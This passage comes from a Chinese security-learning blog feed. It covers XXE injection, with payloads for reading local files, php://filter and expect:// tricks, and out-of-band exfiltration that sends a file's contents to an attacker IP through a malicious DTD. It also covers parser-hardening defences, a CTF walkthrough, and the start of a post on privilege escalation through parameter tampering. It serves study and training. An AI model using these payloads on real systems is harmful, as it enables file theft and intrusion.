&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="dtd声明"><a class="markdownIt-Anchor" href="#dtd声明"></a> DTD声明</h3><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部的 DOCTYPE 声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部文档声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> ”文件名”&gt;</span></span><br></pre></td></tr></table></figure><h3 id="dtd-实体"><a class="markdownIt-Anchor" href="#dtd-实体"></a> DTD 实体</h3><h4 id="内部实体"><a class="markdownIt-Anchor" href="#内部实体"></a> 内部实体</h4><p>略</p><h4 id="外部实体通用实体"><a class="markdownIt-Anchor" href="#外部实体通用实体"></a> 外部实体（通用实体）</h4><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用</p><ol><li><code>&lt;!DOCTYPE 根元素 SYSTEM “文件名&quot;&gt;</code></li><li><code>&lt;!DOCTYPE 根元素 PUBLIC “public_ID&quot; “文件名&quot;&gt;</code></li></ol><p>的形式引用外部实体。</p><h4 id="参数实体"><a class="markdownIt-Anchor" href="#参数实体"></a> 参数实体</h4><ol><li>使用<code> % 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</li><li>只有在DTD文件中，参数实体的声明才能引用其他实体</li><li>和通用实体一样，参数实体也可以外部引用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element;%remote-dtd;</span><br></pre></td></tr></table></figure><h4 id="举例子java"><a class="markdownIt-Anchor" href="#举例子java"></a> 举例子（java）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 ”实体的值”&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> ”URI”&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 参数实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 ”实体的值”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="keyword">SYSTEM</span> ”URI”&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 举例内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 举例外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.1/kk.php&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 举例内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 引用实体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">credit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">credit</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用图解释一下：</p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser.png" alt="XML parser" style="zoom:67%;" /><p>而JAVA是怎么把它变成对象的呢？在Java应用程序中，XML可以用来从客户端获取数据到服务器，我们都熟悉JSON apis，我们也可以用xml来获取信息。大多数情况下，框架会根据xml结构自动填充Java对象，例如：</p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser-java.png" alt="XML parser" style="zoom:67%;" /><h1 id="注入攻击"><a class="markdownIt-Anchor" href="#注入攻击"></a> 注入攻击</h1><h2 id="xml注入攻击内部实体攻击"><a class="markdownIt-Anchor" href="#xml注入攻击内部实体攻击"></a> XML注入攻击（内部实体攻击）</h2><p>为什么要提XML注入呢，我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了，所以看一下。看到，就是插入了一个数据，跟sql啥的一般无二，但是得注意标头是怎么样的，实际上没什么用。</p><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/webp-167696929251616.webp" alt="img" /></p><p>服务器解析xml的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">   <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">   <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">   <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">   <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>libxml_disable_entity_loader（BOOL）</code>函数接收true或false两种布尔型参数，用来表示是否允许禁用外部加载实体，当值为false时允许加载外部实体；通过file_get_contents()加载传入的参数，再通过DOMDocument类中的loadXML函数加载外部传入的实体（XML），最后将结果返回显示。</p><h2 id="xxe-2"><a class="markdownIt-Anchor" href="#xxe-2"></a> XXE</h2><p>因此我们构造一个XML外部实体，用来访问服务器上的敏感文件，然后再数据传输过程中将自己的实体注入。</p><h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件"></a> 读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>通过各种协议绕过</p><h3 id="内网探针或攻击内网应用难利用"><a class="markdownIt-Anchor" href="#内网探针或攻击内网应用难利用"></a> 内网探针或攻击内网应用（难利用）</h3><p><strong>实际应用中基本碰不到（触发漏洞地址），因为有前提条件：</strong></p><ul><li>内网IP地址</li><li>开放端口</li><li>存在xxe漏洞</li><li>构造漏洞地址</li></ul><h3 id="rce难利用"><a class="markdownIt-Anchor" href="#rce难利用"></a> RCE（难利用）</h3><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令 <strong>实际应用中很难碰到</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h3 id="引入外部实体-dtd"><a class="markdownIt-Anchor" href="#引入外部实体-dtd"></a> 引入外部实体 dtd</h3><p>条件：</p><ol><li>观察是否禁止外部实体引入（有点像本地包含与远程包含）</li></ol><p>引入外部实体的原因：</p><ol><li>自定义攻击代码</li><li>绕过恶意代码检测</li></ol><p>代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><strong>evil2.dtd:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="无回显读文件"><a class="markdownIt-Anchor" href="#无回显读文件"></a> 无回显读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>evil2.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1:80/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><h3 id="无回显读文件外带数据可dnslog"><a class="markdownIt-Anchor" href="#无回显读文件外带数据可dnslog"></a> 无回显读文件——外带数据（可dnslog）</h3><p>操作：</p><ol><li><p>服务器处理XML源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://my.local.cn/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>再提交数据的时候引用另一个DTD文件，test.dtd将服务器上的敏感文件进行base64编码后转发给攻击者ip：9999端口上</p></li><li><p>test.dtd （来自你的恶意dtd，在你的服务器里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.210.37:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/webp-167697018708020.webp" alt="img" /></p></li></ol><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程主机上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><p>进一步对XXE漏洞分析后，我们可以很清晰地看到我们实际上都是通过<strong>file协议读取本地文件</strong>，或者通过<strong>http协议发出请求</strong>，<strong>类比一下其他漏洞例如SSRF</strong>，发现这两种漏洞的利用方式非常相似，因为他们都是从服务器向另一台服务器发起请求，所以想要更进一步的利用XXE漏洞我们要清楚在何种平台可以使用何种协议：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>JAVA</th><th>.NET</th></tr></thead><tbody><tr><td>file<br/>http<br/>ftp</td><td>file<br/>http<br/>ftp<br/>php<br/>compress.zlib<br/>compress.bzip2<br/>data<br/>glob<br/>phar</td><td>http<br/>https<br/>ftp<br/>file<br/>jar<br/>net<br/>doc<br/>mailto<br/>gopher *</td><td>file<br/>http<br/>https<br />ftp</td></tr></tbody></table><h1 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h1><ol><li><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP： </span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()；dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python: </span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p></li><li><p><strong>使用第三方应用代码及时升级补丁</strong></p></li></ol><h1 id="实操"><a class="markdownIt-Anchor" href="#实操"></a> 实操</h1><h2 id="发现漏洞"><a class="markdownIt-Anchor" href="#发现漏洞"></a> 发现漏洞</h2><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/image-20230606091005275.png" alt="image-20230606091005275" style="zoom:50%;" /><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/image-20230606091112388.png" alt="image-20230606091112388" style="zoom:50%;" /></p><p>从上面可以看到：XML的数据传输。则在传输数据的地方贴上payload。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///e:/you.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注： file:///c:/ 和 file:/// 分别是windows 和 Linux的r--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 回显 --&gt;</span></span><br><span class="line">what?(我的文本)</span><br></pre></td></tr></table></figure><h2 id="更改类型盲猜"><a class="markdownIt-Anchor" href="#更改类型盲猜"></a> 更改类型（盲猜）</h2><p>原代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1.0/try HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:9882</span><br><span class="line">Content-Length: 36</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://web.jarvisoj.com:9882</span><br><span class="line">Referer: http://web.jarvisoj.com:9882/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;type sth!&quot;,&quot;value&quot;:&quot;own&quot;&#125;</span><br></pre></td></tr></table></figure><p>改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1.0/try HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:9882</span><br><span class="line">Content-Length: 104</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://web.jarvisoj.com:9882</span><br><span class="line">Referer: http://web.jarvisoj.com:9882/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;</span><br><span class="line">&lt;/x&gt;</span><br></pre></td></tr></table></figure><h2 id="java-webgoat"><a class="markdownIt-Anchor" href="#java-webgoat"></a> JAVA webgoat</h2><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser-java.png" alt="XML parser" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/XXE%E4%B8%8EXML.png&quot; alt=&quot;XXE与XML&quot; /&gt;&lt;/p&gt;
&lt;h1 id=</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XXE" scheme="https://j3f5.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-06-03T02:40:31.000Z</published>
    <updated>2023-06-03T02:40:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603112019979.png" alt="image-20230603112019979" style="zoom:67%;" /><h1 id="水平垂直越权"><a class="markdownIt-Anchor" href="#水平垂直越权"></a> 水平垂直越权</h1><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><ol><li>水平：A与B是同一个权限，但是A可以访问B的数据</li><li>垂直：B是高权限用户，而A是低权限，A可以访问B的数据</li><li>未授权访问：通过删除请求中的认证信息后，发起 <strong>重放攻击</strong> 仍然可以访问或者完成操作</li></ol><h2 id="挖洞关键"><a class="markdownIt-Anchor" href="#挖洞关键"></a> 挖洞关键</h2><ol><li><p>找到功能点，当然也可能不是功能点，就是刷新之后返回的一些信息，通过各种参数查询数据库啥的，抓包一个个放，然后看有什么可以利用的</p></li><li><p>抓包查看有什么地方可以修改的，例如如下<code>card_id</code>、<code>uid</code>等等都是可以改的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /json.php?card_id=20128880322 HTTP/1.1</span><br><span class="line">Host: 124.70.64.48:47325</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://124.70.64.48:47325/user_info.php</span><br><span class="line">Cookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></li><li><p>去找你想要相关User的信息，一般可以通过头像的命名方式之类的，与card_id有关系的命名，然后得到一些信息。改一下就重新发包，观察得到了什么信息。</p></li></ol><p>所以总结一下，一些Uid啥的都是很有用的，需要注意搜集</p><h2 id="水平越权操作"><a class="markdownIt-Anchor" href="#水平越权操作"></a> 水平越权操作</h2><ol><li><p>看一下A中可以实现的功能，然后，抓包。【例如：账户名Kobe，然后有个查看信息的操作】</p></li><li><p>看抓包中的参数，更改参数。【例如想查看账户Lucy的详细信息，更改<code>http://.../?name=kobe&amp;submit=...</code>中kobe变成lucy】</p><ol><li>怎么知道有Lucy这个人？信息搜集+注册框显示是否存在此用户+访问其他个人空间查看用户名</li></ol></li><li><p>如果返回成功，那就存在水平越权</p></li></ol><h2 id="垂直越权操作"><a class="markdownIt-Anchor" href="#垂直越权操作"></a> 垂直越权操作</h2><ol><li><p>先去admin界面操作并抓到包/看到相关界面（例如在普通用户界面有的按钮是灰色，然后猜解数据包的构成）</p></li><li><p>更换猜解/抓到的admin操作数据包，然后替换普通用户的cookie</p></li><li><p>如果操作成功，那就存在垂直越权漏洞</p></li></ol><p>前提条件：（获取admin的操作数据包，那么怎么来的数据包？）</p><ol><li>普通用户前端有操作界面可以抓取操作数据包</li><li>通过网站源码本地搭建模拟抓取</li><li>盲猜</li></ol><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>即：验证是产生在哪个地方的。所以：<strong>如果在访问数据包的时候有传输用户的编号，用户组编号或者类型编号，那么尝试对这个值进行修改，就是测试越权漏洞的基本。</strong></p><h3 id="前端安全造成界面"><a class="markdownIt-Anchor" href="#前端安全造成界面"></a> 前端安全造成——界面</h3><p>即前端验证是否有这个权限去执行这个操作，然后放行或者禁止。所以后端不做验证直接全盘接受，如果前端伪造，那么就会有这样的漏洞。<em>其实可以算是后端代码逻辑错误</em>，例如：php代码没有验证是什么权限，只是验证是否登录。</p><h3 id="后端安全造成数据库"><a class="markdownIt-Anchor" href="#后端安全造成数据库"></a> 后端安全造成——数据库</h3><p>通过验证usertype来确定用户权限。</p><blockquote><p>id, username, password, usertype</p><p>1, admin, 123456, 1</p><p>2, xiaodi, 365567, 2</p></blockquote><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><ol><li>secscan-authcheck：<a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></li><li>小米范：<a href="http://pan.baidu.com/s/1pLjaQKF">http://pan.baidu.com/s/1pLjaQKF</a> (privilegechecker)。他就是多个窗口，省了你切换窗口的麻烦。</li><li>Authz：Burp的插件 直接在官方那下</li></ol><h1 id="登录爆破与支付数据篡改"><a class="markdownIt-Anchor" href="#登录爆破与支付数据篡改"></a> 登录爆破与支付数据篡改</h1><h2 id="登录功能点安全问题"><a class="markdownIt-Anchor" href="#登录功能点安全问题"></a> 登录功能点安全问题</h2><h3 id="爆破测试"><a class="markdownIt-Anchor" href="#爆破测试"></a> 爆破测试</h3><p>一般来说http传输数据流量的时候是不加密传输的，而Https是加密传输的。例如用户名密码，baidu的密码就是经过加密的。但是也不绝对，https不一定对密码进行加密操作，而Http也可能对密码进行加密。</p><p>然而，它也是可以被爆破的，md5什么的可以直接爆破。</p><img 